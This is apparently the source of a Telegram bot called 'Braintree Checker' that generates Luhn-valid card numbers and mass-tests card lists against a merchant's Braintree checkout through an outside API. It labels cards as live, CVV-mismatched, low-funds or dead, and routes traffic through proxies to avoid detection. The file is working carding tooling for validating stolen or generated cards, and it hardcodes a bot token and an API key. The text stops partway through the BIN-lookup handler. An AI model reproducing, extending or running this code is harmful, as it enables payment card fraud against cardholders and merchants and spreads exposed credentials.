import telebot
from telebot import types
import requests
import re
import uuid
import time
from datetime import datetime
import urllib3
import random
import threading
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = '8770871462:AAFrOsWeGQxHVdjQ0SUbTJaODAFLKDPD1jE'
ADMIN_ID = 5629984144
bot = telebot.TeleBot(BOT_TOKEN, num_threads=10)

USERS_FILE = 'users.json'
MAX_WORKERS = 20  # For parallel processing

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('approved_users', [])), data.get('pending_requests', {})
        except Exception as e:
            print(f"Error loading users: {e}")
            return set(), {}
    return set(), {}

def save_users():
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump({'approved_users': list(approved_users), 'pending_requests': pending_requests}, f, indent=4)
    except Exception as e:
        print(f"Error saving users: {e}")

approved_users, pending_requests = load_users()

ACTIVE_PROXY = None
PROXY_LOCK = threading.Lock()

def test_proxy(proxy_url):
    """Test proxy with multiple attempts - FAST"""
    test_urls = [
        'https://httpbin.org/ip',
        'https://api.ipify.org',
        'https://www.google.com'
    ]
    
    for test_url in test_urls:
        try:
            response = requests.get(
                test_url,
                proxies={'http': proxy_url, 'https': proxy_url},
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 301, 302, 403, 404]:
                print(f"✅ Proxy test passed on {test_url}")
                return True
        except Exception as e:
            print(f"Proxy test failed on {test_url}: {e}")
            continue
    return False

def set_proxy(proxy_url):
    global ACTIVE_PROXY
    
    # Parse WebShare format: host:port:username:password
    if ':' in proxy_url and proxy_url.count(':') == 3:
        try:
            parts = proxy_url.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_url = f"http://{username}:{password}@{host}:{port}"
                print(f"✅ Detected WebShare format")
        except Exception as e:
            print(f"WebShare parse error: {e}")
            pass
    
    # Parse format: host:port@username:password
    elif '@' in proxy_url and not proxy_url.startswith('http'):
        try:
            parts = proxy_url.split('@')
            if len(parts) == 2:
                host_port = parts[0]
                user_pass = parts[1]
                proxy_url = f"http://{user_pass}@{host_port}"
                print(f"✅ Detected host:port@user:pass format")
        except Exception as e:
            print(f"Parse error: {e}")
            pass
    
    # Add http:// if missing
    if not proxy_url.startswith('http://') and not proxy_url.startswith('https://'):
        proxy_url = f"http://{proxy_url}"
    
    print(f"Testing proxy: {proxy_url[:50]}...")
    if test_proxy(proxy_url):
        with PROXY_LOCK:
            ACTIVE_PROXY = proxy_url
        print(f"✅ Proxy set successfully!")
        return True, "✅ Proxy is live and set successfully!"
    
    print(f"❌ Proxy failed all tests")
    return False, "❌ Proxy is dead or unreachable"

def remove_proxy():
    global ACTIVE_PROXY
    with PROXY_LOCK:
        ACTIVE_PROXY = None
    return "✅ Proxy removed. Using direct connection."

def get_proxies():
    with PROXY_LOCK:
        return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None

DEFAULT_BRAINTREE_SITE = "https://www.coca-colastore.com"
JOSS_API = "https://yosh-api-e55w.onrender.com"

user_sessions = {}
user_cooldowns = {}
stop_checking = {}
user_custom_sites = {}
COOLDOWN_CHECK = 3  # Faster - reduced from 5
COOLDOWN_MASS = 5   # Faster - reduced from 10
MAX_MASS_CARDS = 15  # Increased from 10
MAX_FILE_CARDS = 500
MAX_WORKERS = 30  # Increased from 20 for faster parallel processing
HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"

def get_card_info(card_number):
    """Get card info with error handling"""
    info = {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🌍', 'bank': 'Unknown', 'level': 'Unknown'}
    bin_number = card_number[:6]
    
    if HANDYAPI_KEY:
        try:
            response = requests.get(
                f"https://data.handyapi.com/bin/{bin_number}",
                headers={'x-api-key': HANDYAPI_KEY, 'User-Agent': 'Mozilla/5.0'},
                timeout=5,
                verify=False
            )
            if response.status_code == 200:
                data = response.json()
                if data.get('Scheme'): 
                    info['brand'] = str(data['Scheme']).upper()
                if data.get('Type'): 
                    info['type'] = str(data['Type']).title()
                if data.get('Category'): 
                    info['level'] = str(data['Category']).title()
                elif data.get('CardTier'): 
                    info['level'] = str(data['CardTier']).title()
                if data.get('Issuer'): 
                    info['bank'] = str(data['Issuer']).title()
                country_data = data.get('Country')
                if country_data and isinstance(country_data, dict):
                    if country_data.get('Name'): 
                        info['country'] = country_data['Name'].upper()
                    if country_data.get('A2') and len(country_data['A2']) == 2:
                        info['flag'] = ''.join(chr(127397 + ord(c)) for c in country_data['A2'].upper())
                if info['bank'] != 'Unknown' and info['country'] != 'Unknown':
                    return info
        except Exception as e:
            print(f"HandyAPI error: {e}")
    
    try:
        response = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=5,
            verify=False
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('scheme'): 
                info['brand'] = data['scheme'].upper()
            if data.get('type'): 
                info['type'] = data['type'].title()
            if data.get('brand'): 
                info['level'] = data['brand'].title()
            if data.get('bank', {}).get('name'): 
                info['bank'] = data['bank']['name'].title()
            if data.get('country', {}).get('name'): 
                info['country'] = data['country']['name'].upper()
            if data.get('country', {}).get('alpha2') and len(data['country']['alpha2']) == 2:
                info['flag'] = ''.join(chr(127397 + ord(c)) for c in data['country']['alpha2'].upper())
    except Exception as e:
        print(f"BinList error: {e}")
    
    if card_number[0] == '4': 
        info['brand'], info['type'] = 'VISA', 'Credit'
    elif card_number[:2] in ['51', '52', '53', '54', '55']: 
        info['brand'], info['type'] = 'MASTERCARD', 'Credit'
    elif card_number[:2] in ['34', '37']: 
        info['brand'], info['type'] = 'AMERICAN EXPRESS', 'Credit'
    
    return info

def luhn_check(card_number):
    try:
        digits = [int(d) for d in str(card_number)]
        checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
        return checksum % 10 == 0
    except:
        return False

def calculate_luhn_digit(partial_card):
    try:
        digits = [int(d) for d in str(partial_card) + '0']
        checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
        return (10 - (checksum % 10)) % 10
    except:
        return 0

def generate_cards(bin_number, quantity, exp_month=None, exp_year=None):
    if len(bin_number) < 6:
        return None, "BIN must be at least 6 digits"
    if quantity < 1 or quantity > 20:
        return None, "Quantity must be between 1 and 20"
    
    cards = []
    card_length = 16 if bin_number[0] in ['4', '5'] else 15
    
    for _ in range(quantity):
        partial = bin_number + ''.join([str(random.randint(0, 9)) for _ in range(card_length - len(bin_number) - 1)])
        check_digit = calculate_luhn_digit(partial)
        card_number = partial + str(check_digit)
        
        if exp_month and exp_year:
            month = int(exp_month)
            year = int(exp_year) if len(str(exp_year)) == 2 else int(str(exp_year)[-2:])
        else:
            month = random.randint(1, 12)
            year = random.randint(25, 30)
        
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        cards.append(f"{card_number}|{month:02d}|{year:02d}|{cvv}")
    
    return cards, None

def check_cooldown(chat_id, command_type):
    current_time = time.time()
    cooldown = COOLDOWN_CHECK if command_type == 'check' else COOLDOWN_MASS
    if chat_id not in user_cooldowns: 
        user_cooldowns[chat_id] = {}
    if command_type in user_cooldowns[chat_id]:
        time_passed = current_time - user_cooldowns[chat_id][command_type]
        if time_passed < cooldown:
            return False, int(cooldown - time_passed) + 1
    user_cooldowns[chat_id][command_type] = current_time
    return True, 0

def is_approved(user_id):
    return user_id == ADMIN_ID or user_id in approved_users

def require_approval(func):
    def wrapper(message):
        if not is_approved(message.from_user.id):
            text = "╔════════════════════╗\n"
            text += "║   🚫 ACCESS DENIED   ║\n"
            text += "╚════════════════════╝\n\n"
            text += "⚠️ You need admin approval\n"
            text += "📝 Use /request to get access\n"
            try:
                bot.send_message(message.chat.id, text)
            except Exception as e:
                print(f"Error sending message: {e}")
            return
        return func(message)
    return wrapper

def get_braintree_site(chat_id):
    if chat_id in user_custom_sites and user_custom_sites[chat_id]:
        return user_custom_sites[chat_id]
    return DEFAULT_BRAINTREE_SITE

class BraintreeChecker:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        self.session = requests.Session()
        # Keep session alive for faster subsequent requests
        self.session.headers.update({
            'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def validate_card(self, card):
        """Validate card with OPTIMIZED speed and error handling"""
        start_time = time.time()
        
        try:
            parts = card.replace(' ', '').split('|')
            if len(parts) != 4:
                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌', 'time': 0}
            
            number, exp_month, exp_year, cvv = parts
            
            if not number.isdigit() or len(number) < 13 or len(number) > 19:
                return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌', 'time': 0}
            
            card_info = get_card_info(number)
            
            if not luhn_check(number):
                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info, 'time': 0}
            
            if len(exp_year) == 4:
                exp_year = exp_year[-2:]
            elif len(exp_year) == 1:
                exp_year = f"0{exp_year}"
            
        except Exception as e:
            print(f"Card parse error: {e}")
            return {'status': 'error', 'message': 'Parse error', 'icon': '❌', 'time': 0}
        
        site_url = get_braintree_site(self.chat_id)
        
        # OPTIMIZED: Single attempt with longer timeout for stability
        try:
            params = {
                'lista': f"{number}|{exp_month}|{exp_year}|{cvv}",
                'proxy': '',
                'sites': site_url,
                'xlite': 'undefined'
            }
            
            # Single fast request - no retries to speed up
            response = self.session.get(
                JOSS_API,
                params=params,
                proxies=get_proxies(),
                verify=False,
                timeout=35,  # Reduced from 45
                stream=False  # Don't stream, get full response faster
            )
            
            elapsed_time = round(time.time() - start_time, 2)
            
            if response.status_code != 200:
                return {
                    'status': 'error',
                    'message': f'API Error: {response.status_code}',
                    'icon': '❌',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            response_text = response.text.lower()
            
            # FAST parsing - check most common responses first
            if 'approved' in response_text or 'success' in response_text or 'authorized' in response_text:
                return {
                    'status': 'live',
                    'message': 'Payment successful',
                    'icon': '✅',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            if 'cvv' in response_text or 'security code' in response_text:
                return {
                    'status': 'live_cvv',
                    'message': 'Card Issuer Declined CVV',
                    'icon': '⚠️',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            if 'insufficient' in response_text:
                return {
                    'status': 'insufficient',
                    'message': 'Insufficient Funds',
                    'icon': '💰',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            if 'declined' in response_text or 'rejected' in response_text:
                message = 'Card Declined'
                if 'fraud' in response_text:
                    message = 'Gateway Rejected: fraud'
                elif 'processor declined' in response_text:
                    message = 'Processor Declined'
                    
                return {
                    'status': 'dead',
                    'message': message,
                    'icon': '❌',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            # Default response
            return {
                'status': 'dead',
                'message': 'Card Declined',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }
                
        except requests.exceptions.Timeout:
            elapsed_time = round(time.time() - start_time, 2)
            return {
                'status': 'error',
                'message': 'Connection timeout',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }
        except Exception as e:
            elapsed_time = round(time.time() - start_time, 2)
            print(f"Validation error: {e}")
            return {
                'status': 'error',
                'message': 'API Error',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }

def send_safe(chat_id, text, **kwargs):
    """Safe send message with error handling"""
    try:
        return bot.send_message(chat_id, text, **kwargs)
    except Exception as e:
        print(f"Error sending message to {chat_id}: {e}")
        return None

def edit_safe(chat_id, message_id, text, **kwargs):
    """Safe edit message with error handling"""
    try:
        return bot.edit_message_text(text, chat_id, message_id, **kwargs)
    except Exception as e:
        print(f"Error editing message {message_id}: {e}")
        return None

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not is_approved(user_id):
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "⚠️ ACCESS REQUIRED ⚠️\n\n"
        text += "🔒 You need admin approval\n"
        text += "📝 Use /request for access\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "🎯 MAIN COMMANDS\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        text += "💳 /bchk - Single card check\n"
        text += "📦 /bmass - Multiple cards check\n"
        text += "📁 /bfile - Upload .txt file\n"
        text += "🔍 /bin - BIN lookup\n"
        text += "🎲 /gen - Generate cards\n"
        text += "🌍 /custom_site - Set your site\n"
        text += "🗑️ /remove_site - Remove site\n"
        text += "📍 /site - Check current site\n"
        text += "❓ /help - Show help\n\n"
        
        if user_id == ADMIN_ID:
            text += "⚙️ ADMIN COMMANDS\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "🌐 /proxy - Set proxy\n"
            text += "🚫 /removeproxy - Remove proxy\n"
            text += "📊 /proxystatus - Check status\n"
            text += "👥 /users - List users\n"
            text += "⏳ /pending - Pending requests\n"
            text += "📢 /broadcast - Send message to all\n\n"
        
        text += "✨ Powered by YOSH ✨"
    send_safe(message.chat.id, text)

@bot.message_handler(commands=['request'])
def request_access(message):
    user_id = message.from_user.id
    if is_approved(user_id):
        text = "╔════════════════════╗\n"
        text += "║   ✅ APPROVED   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "🎉 You already have access!"
        send_safe(message.chat.id, text)
        return
    if user_id in pending_requests:
        text = "╔════════════════════╗\n"
        text += "║   ⏳ PENDING   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "⏱️ Your request is pending\n"
        text += "Please wait for approval..."
        send_safe(message.chat.id, text)
        return
    
    username = message.from_user.username or "No username"
    first_name = message.from_user.first_name or "Unknown"
    last_name = message.from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    
    pending_requests[user_id] = {
        'username': username, 
        'name': full_name, 
        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_users()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
        types.InlineKeyboardButton("❌ Deny", callback_data=f"deny_{user_id}")
    )
    
    admin_msg = "╔════════════════════════╗\n"
    admin_msg += "║  📥 NEW ACCESS REQUEST  ║\n"
    admin_msg += "╚════════════════════════╝\n\n"
    admin_msg += f"👤 Name: {full_name}\n"
    admin_msg += f"🔗 Username: @{username}\n"
    admin_msg += f"🆔 ID: {user_id}\n"
    admin_msg += f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    admin_msg += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    admin_msg += "Approve this user?"
    
    send_safe(ADMIN_ID, admin_msg, reply_markup=markup)
    
    user_msg = "╔════════════════════╗\n"
    user_msg += "║   📤 REQUEST SENT   ║\n"
    user_msg += "╚════════════════════╝\n\n"
    user_msg += "✅ Request sent to admin\n"
    user_msg += "⏳ Please wait for approval..."
    send_safe(message.chat.id, user_msg)

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_') or call.data.startswith('deny_'))
def handle_approval_callback(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!")
        return
    
    try:
        action, user_id = call.data.split('_')
        user_id = int(user_id)
        
        if action == 'approve':
            approved_users.add(user_id)
            pending_requests.pop(user_id, None)
            save_users()
            bot.answer_callback_query(call.id, "✅ User approved!")
            edit_safe(call.message.chat.id, call.message.message_id, f"✅ User {user_id} has been APPROVED!")
            try:
                approval_msg = "╔════════════════════╗\n"
                approval_msg += "║   🎉 APPROVED!   ║\n"
                approval_msg += "╚════════════════════╝\n\n"
                approval_msg += "✅ Access granted!\n"
                approval_msg += "🚀 Type /start to begin"
                send_safe(user_id, approval_msg)
            except:
                pass
        elif action == 'deny':
            pending_requests.pop(user_id, None)
            save_users()
            bot.answer_callback_query(call.id, "❌ User denied!")
            edit_safe(call.message.chat.id, call.message.message_id, f"❌ User {user_id} has been DENIED!")
            try:
                deny_msg = "╔════════════════════╗\n"
                deny_msg += "║   ❌ DENIED   ║\n"
                deny_msg += "╚════════════════════╝\n\n"
                deny_msg += "🚫 Access denied by admin"
                send_safe(user_id, deny_msg)
            except:
                pass
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(call.id, "❌ Error processing request")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_check_'))
def handle_stop_check(call):
    try:
        chat_id = int(call.data.split('_')[2])
        if call.from_user.id == chat_id or call.from_user.id == ADMIN_ID:
            stop_checking[chat_id] = True
            bot.answer_callback_query(call.id, "🛑 Stopping check...")
    except Exception as e:
        print(f"Stop check error: {e}")

@bot.message_handler(commands=['bchk'])
@require_approval
def braintree_check(message):
    try:
        can_proceed, remaining = check_cooldown(message.chat.id, 'check')
        if not can_proceed:
            text = "╔════════════════════╗\n"
            text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
            text += "╚════════════════════╝\n\n"
            text += f"⏱️ Wait {remaining} seconds"
            send_safe(message.chat.id, text)
            return
        
        command_parts = message.text.split(maxsplit=1)
        
        if len(command_parts) < 2:
            if message.chat.id in user_sessions and 'generated_cards' in user_sessions[message.chat.id]:
                cards = user_sessions[message.chat.id]['generated_cards']
                if cards:
                    card_input = cards[0]
                else:
                    text = "╔════════════════════╗\n"
                    text += "║  ❌ INVALID FORMAT  ║\n"
                    text += "╚════════════════════╝\n\n"
                    text += "Usage: /bchk card|mm|yy|cvv"
                    send_safe(message.chat.id, text)
                    return
            else:
                text = "╔════════════════════╗\n"
                text += "║  ❌ INVALID FORMAT  ║\n"
                text += "╚════════════════════╝\n\n"
                text += "Usage: /bchk card|mm|yy|cvv"
                send_safe(message.chat.id, text)
                return
        else:
            card_input = command_parts[1].strip()
        
        status_msg = send_safe(message.chat.id, f"⏳ Checking card...\n\n💳 {card_input}")
        if not status_msg:
            return
        
        checker = BraintreeChecker(message.chat.id)
        result = checker.validate_card(card_input)
        card_info = result.get('card_info', {})
        
        # Format response
        check_response = "╔═══════════════════════════════╗\n"
        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
        check_response += "╚═══════════════════════════════╝\n\n"
        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
        
        if result['status'] == 'live':
            check_response += "<b>Status: ✅ Card Live</b>\n\n"
        elif result['status'] == 'live_cvv':
            check_response += "<b>Status: ⚠️ CVV Mismatch</b>\n\n"
        elif result['status'] == 'insufficient':
            check_response += "<b>Status: 💰 Insufficient Funds</b>\n\n"
        else:
            check_response += "<b>Status: ❌ Card Dead</b>\n\n"
        
        check_response += "<b>Card Info:</b>\n"
        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
        check_response += f"<b>Gateway:</b> Braintree\n"
        check_response += f"<b>Response:</b> {result['message']}\n\n"
        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        edit_safe(message.chat.id, status_msg.message_id, check_response, parse_mode='HTML')
    except Exception as e:
        print(f"bchk error: {e}")
        send_safe(message.chat.id, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['bmass'])
@require_approval
def braintree_mass(message):
    try:
        can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
        if not can_proceed:
            text = "╔════════════════════╗\n"
            text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
            text += "╚════════════════════╝\n\n"
            text += f"⏱️ Wait {remaining} seconds"
            send_safe(message.chat.id, text)
            return
        
        command_parts = message.text.split(maxsplit=1)
        
        if len(command_parts) < 2:
            if message.chat.id in user_sessions and 'generated_cards' in user_sessions[message.chat.id]:
                cards = user_sessions[message.chat.id]['generated_cards']
                if not cards:
                    text = "╔════════════════════╗\n"
                    text += "║  ❌ INVALID FORMAT  ║\n"
                    text += "╚════════════════════╝\n\n"
                    text += f"Usage: /bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
                    text += f"Max: {MAX_MASS_CARDS} cards"
                    send_safe(message.chat.id, text)
                    return
                if len(cards) > MAX_MASS_CARDS:
                    text = "╔════════════════════╗\n"
                    text += "║  ❌ TOO MANY CARDS  ║\n"
                    text += "╚════════════════════╝\n\n"
                    text += f"You generated {len(cards)} cards\n"
                    text += f"Max for /bmass: {MAX_MASS_CARDS}\n\n"
                    text += "💡 Use /bfile for more cards"
                    send_safe(message.chat.id, text)
                    return
            else:
                text = "╔════════════════════╗\n"
                text += "║  ❌ INVALID FORMAT  ║\n"
                text += "╚════════════════════╝\n\n"
                text += f"Usage: /bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
                text += f"Max: {MAX_MASS_CARDS} cards"
                send_safe(message.chat.id, text)
                return
        else:
            cards_text = command_parts[1].strip()
            cards = [c.strip() for c in cards_text.split('\n') if c.strip()]
        
        if len(cards) > MAX_MASS_CARDS:
            text = "╔════════════════════╗\n"
            text += "║  ❌ TOO MANY CARDS  ║\n"
            text += "╚════════════════════╝\n\n"
            text += f"Max: {MAX_MASS_CARDS} cards\n"
            text += f"You sent: {len(cards)} cards"
            send_safe(message.chat.id, text)
            return
        
        status_msg = send_safe(message.chat.id, f"⏳ Checking {len(cards)} cards...")
        if not status_msg:
            return
        
        # SUPER FAST: Parallel checking with all workers
        checker = BraintreeChecker(message.chat.id)
        results = []
        
        with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(cards))) as executor:
            future_to_card = {executor.submit(checker.validate_card, card): card for card in cards}
            
            completed = 0
            for future in as_completed(future_to_card):
                card = future_to_card[future]
                try:
                    result = future.result()
                    results.append((card, result))
                    completed += 1
                    
                    # Update every 3 cards for speed
                    if completed % 3 == 0 or completed == len(cards):
                        edit_safe(message.chat.id, status_msg.message_id, 
                                 f"⚡ Checking {completed}/{len(cards)}...")
                except Exception as e:
                    print(f"Card check error: {e}")
                    results.append((card, {'status': 'error', 'message': 'Error', 'icon': '❌', 'time': 0}))
        
        # Sort results to maintain order
        card_order = {card: idx for idx, card in enumerate(cards)}
        results.sort(key=lambda x: card_order[x[0]])
        
        mass_response = "╔════════════════════════╗\n"
        mass_response += "║  📦 MASS CHECK RESULTS  ║\n"
        mass_response += "╚════════════════════════╝\n\n"
        mass_response += f"✅ Total: {len(results)} cards\n"
        mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for card, result in results:
            mass_response += f"{result['icon']} <code>{card}</code>\n"
            mass_response += f"└ {result['message']} ({result['time']}s)\n\n"
        
        mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        mass_response += f"👤 By: @{message.from_user.username or 'User'}"
        
        edit_safe(message.chat.id, status_msg.message_id, mass_response, parse_mode='HTML')
    except Exception as e:
        print(f"bmass error: {e}")
        send_safe(message.chat.id, "❌ An error occurred. Please try again.")

# Continue with remaining commands...
@bot.message_handler(commands=['bfile'])
@require_approval
def request_braintree_file(message):
    try:
        text = "╔════════════════════╗\n"
        text += "║  📁 UPLOAD FILE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "📤 Please upload .txt file\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        text += "📝 Format: card|mm|yy|cvv\n"
        text += "📊 One card per line\n"
        text += f"📈 Max: {MAX_FILE_CARDS} cards"
        send_safe(message.chat.id, text)
        user_sessions[message.chat.id] = {'awaiting_file': True}
    except Exception as e:
        print(f"bfile error: {e}")

@bot.message_handler(content_types=['document'])
@require_approval
def handle_braintree_file(message):
    try:
        if message.chat.id not in user_sessions or not user_sessions[message.chat.id].get('awaiting_file'):
            send_safe(message.chat.id, "❌ Please use /bfile command first")
            return
        
        user_sessions[message.chat.id]['awaiting_file'] = False
        
        if not message.document.file_name.endswith('.txt'):
            send_safe(message.chat.id, "❌ Please upload a .txt file")
            return
        
        can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
        if not can_proceed:
            text = f"⏳ Wait {remaining} seconds"
            send_safe(message.chat.id, text)
            return
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        cards_text = downloaded_file.decode('utf-8')
        cards = [c.strip() for c in cards_text.split('\n') if c.strip() and '|' in c]
        
        if len(cards) > MAX_FILE_CARDS:
            send_safe(message.chat.id, f"❌ Max {MAX_FILE_CARDS} cards\nYour file: {len(cards)} cards")
            return
        
        if len(cards) == 0:
            send_safe(message.chat.id, "❌ No valid cards found")
            return
        
        stop_checking[message.chat.id] = False
        
        stop_markup = types.InlineKeyboardMarkup()
        stop_markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{message.chat.id}"))
        
        status_msg = send_safe(message.chat.id, "⏳ Initializing...", reply_markup=stop_markup)
        if not status_msg:
            return
        
        checker = BraintreeChecker(message.chat.id)
        results = []
        live_count = cvv_count = low_funds_count = dead_count = 0
        
        # Use ThreadPoolExecutor for parallel checking
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_card = {executor.submit(checker.validate_card, card): card for card in cards}
            
            for idx, future in enumerate(as_completed(future_to_card), 1):
                if stop_checking.get(message.chat.id, False):
                    executor.shutdown(wait=False)
                    break
                
                card = future_to_card[future]
                try:
                    result = future.result()
                    results.append((card, result))
                    
                    if result['status'] == 'live':
                        live_count += 1
                    elif result['status'] == 'live_cvv':
                        cvv_count += 1
                    elif result['status'] == 'insufficient':
                        low_funds_count += 1
                    else:
                        dead_count += 1
                    
                    # Update every 5 cards to reduce API calls
                    if idx % 5 == 0 or idx == len(cards):
                        progress_percent = int((idx / len(cards)) * 100)
                        bar_length = 20
                        filled_length = int(bar_length * idx // len(cards))
                        bar = '█' * filled_length + '░' * (bar_length - filled_length)
                        
                        progress_msg = f"📊 <b>CHECKING...</b>\n\n"
                        progress_msg += f"✅ Live: <code>{live_count}</code>\n"
                        progress_msg += f"⚠️ CVV: <code>{cvv_count}</code>\n"
                        progress_msg += f"💰 Low: <code>{low_funds_count}</code>\n"
                        progress_msg += f"❌ Dead: <code>{dead_count}</code>\n\n"
                        progress_msg += f"<code>[{bar}]</code>\n"
                        progress_msg += f"<b>{progress_percent}%</b> • {idx}/{len(cards)}"
                        
                        edit_safe(message.chat.id, status_msg.message_id, progress_msg, parse_mode='HTML', reply_markup=stop_markup)
                except Exception as e:
                    print(f"File check error: {e}")
                    results.append((card, {'status': 'error', 'message': 'Error', 'icon': '❌'}))
        
        was_stopped = stop_checking.get(message.chat.id, False)
        stop_checking[message.chat.id] = False
        
        file_response = "╔════════════════════════════╗\n"
        file_response += f"║   {'🛑 STOPPED' if was_stopped else '✅ COMPLETE'}   ║\n"
        file_response += "╚════════════════════════════╝\n\n"
        file_response += f"📥 Total: <code>{len(results)}</code>\n"
        file_response += f"✅ Live: <code>{live_count}</code>\n"
        file_response += f"⚠️ CVV: <code>{cvv_count}</code>\n"
        file_response += f"💰 Low: <code>{low_funds_count}</code>\n"
        file_response += f"❌ Dead: <code>{dead_count}</code>\n\n"
        
        if live_count > 0 or cvv_count > 0 or low_funds_count > 0:
            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            file_response += "🎯 <b>LIVE CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            for card, result in results:
                if result['status'] in ['live', 'live_cvv', 'insufficient']:
                    file_response += f"{result['icon']} <code>{card}</code>\n└ <i>{result['message']}</i>\n\n"
        
        file_response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        file_response += f"👤 @{message.from_user.username or 'User'}"
        
        edit_safe(message.chat.id, status_msg.message_id, file_response, parse_mode='HTML')
    except Exception as e:
        print(f"File handler error: {e}")
        send_safe(message.chat.id, f"❌ Error: {str(e)[:50]}")

@bot.message_handler(commands=['bin'])
@require_approval
def check_bin(message):
    try:
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
            send_safe(message.chat.id, "Usage: /bin 464995")
            return
        
        bin_number = command_parts[1].strip()
        if not bin_number.isdigit() or len(bin_number) < 6:
            send_safe(message.chat.id, "❌ BIN must be at least 6 digits")
            return
        
        status_msg = send_safe(message.chat.id, "🔍 Looking up BIN...")
        card_info = get_card_info(bin_number.ljust(16, '0'))
        
        bin_response = "╔════════════════════════╗\n"
        bin_response += "║   🔍 BIN LOOKUP   ║\n"
        bin_response += "╚════════════════════════╝\n\n"
        bin_response += f"🔢 BIN: {bin_number}\n"
        bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        bin_response += f"💳 Brand: {card_info.get('brand', 'Unknown')}\n"
        bin_response += f"📊 Type: {card_info.get('type', 'Unknown')}\n"
        bin_response += f"⭐ Level: {card_info.get('level', 'Unknown')}\n"
        bin_response += f"🏦 Bank: {card_info.get('bank', 'Unknown')}\n"
        bin_response += f"{card_info.get('flag', '🌍')} Country: {card_info.get('country', 'Unknown')}\n"
        bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        bin_response += f"👤 By: @{message.from_user.username or 'User'}"
        
